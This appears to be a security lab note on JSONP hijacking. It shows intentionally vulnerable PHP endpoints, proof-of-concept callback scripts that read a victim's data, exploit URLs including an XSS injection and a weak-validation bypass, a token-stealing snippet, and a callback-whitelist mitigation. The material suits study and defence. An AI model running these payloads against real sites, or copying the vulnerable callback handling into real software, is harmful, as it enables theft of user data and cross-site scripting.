# JSONP

Code Vulnerable

```html
<?php
session_start();

if($_SESSION['islogin'] != 1){
    header("Location: login.php");
    die();
}

?>
<html>
  <head>
    <title>Books Library</title>
    <link rel="stylesheet" type="text/css" href="../style/css.css">
  </head>
  <body id="bodyId">
    <div class="header">
      <a href="index.php" class="logo">Books Library</a>
      <div class="header-right">
        <a href="index.php">Home</a>
        <a class="active" href="profile.php">Profile</a>
        <a href="login.php">Login</a>
      </div>
    </div>
    <div id=output>
    	
    </div>
    <div class="container">
    	**<script type="text/javascript">
    		function userInfo(data){
    			var name = '<center><span>User Name: '+data["username"]+'</span><br>',
    				email = '<span>Email: '+data['email']+'</span><br>',
    				fname = '<span>Full Name: '+data['Full Name']+'</span></center>';
    			document.getElementById('output').innerHTML = name+email+fname;
    		}
    	</script>**
    	<script src="<http://vuln.labs/labs/jsonp/info.php?callback=userInfo>"></script>
    </div>
  </body>
</html>
```

POC

```jsx
**<script>
	function userInfo(data){
		document.write(JSON.stringify(data))
	}
</script>
<script src='<http://localhost/labs/jsonp/info.php?callback=userInfo>'></script>**
```

Mitigation

Use CORS Instead of JSONP

Strict Callback Validation

```php
<?php
header('Content-Type: application/javascript');

**$allowed_callbacks = ['safeFunction'];**
$callback = $_GET['callback'];

if (in_array($callback, $allowed_callbacks)) {
    $data = [
        "name" => "John Doe",
        "email" => "john@example.com"
    ];

    echo $callback . '(' . json_encode($data) . ');';
} else {
    echo 'console.error("Invalid callback function.");';
}

```

JSONP Content-Type Validation

More Complex

#### Scenario 1: Exploiting with Malicious Parameters

```jsx
<?php
header('Content-Type: application/javascript');

$callback = $_GET['callback'];
$name = isset($_GET['name']) ? $_GET['name'] : 'John Doe';
$email = isset($_GET['email']) ? $_GET['email'] : 'john@example.com';

$data = [
    "name" => $name,
    "email" => $email
];

// Vulnerable JSONP response with user input
echo $callback . '(' . json_encode($data) . ');';

```

exploit

```jsx
<http://localhost/vulnerable_server.php?callback=stealData&name=><script>alert('XSS')</script>&email=attacker@example.com

```

get XSS and JSONP data

<figure><img src="../../.gitbook/assets/image (86).png" alt=""><figcaption></figcaption></figure>

#### Scenario 2: Bypassing Weak Validation

```jsx
<?php
header('Content-Type: application/javascript');

$callback = $_GET['callback'];
$allowed_callbacks = ['safeFunction'];

if (strpos($callback, 'safe') === 0) {
    $data = [
        "name" => "John Doe",
        "email" => "john@example.com"
    ];

    echo $callback . '(' . json_encode($data) . ');';
} else {
    echo 'console.error("Invalid callback function.");';
}
```

#### Exploit

```jsx
<http://vulnerable.com/vulnerable_server.php?callback=safeStealData>
```

#### Scenario 4: JSONP Hijacking via CORS Misconfiguration

#### CORS-Enabled

```php
<?php
header('Access-Control-Allow-Origin: *'); // Wide open CORS policy
header('Content-Type: application/javascript');

$callback = $_GET['callback'];
$data = [
    "token" => "58rec269qs4a9w8ewd2a6ghy6", // Sensitive data
];

echo $callback . '(' . json_encode($data) . ');';

```

Exploit

```javascript
<script>
function safeStealData(data) {
    console.log("Stolen token:", data.token);
    // Further actions like sending the token to the attacker's server
}
</script>
<script src="<http://localhost/labs/jsonp/plus/vuln_server3.php?callback=safeStealData>"></script>
```

Scenario 5: Advanced URL Manipulation

```php
<?php
header('Content-Type: application/javascript');

$callback = **urldecode**($_GET['callback']);
$data = [
    "name" => "John Doe",
    "email" => "john@example.com"
];

echo $callback . '(' . json_encode($data) . ');';
```
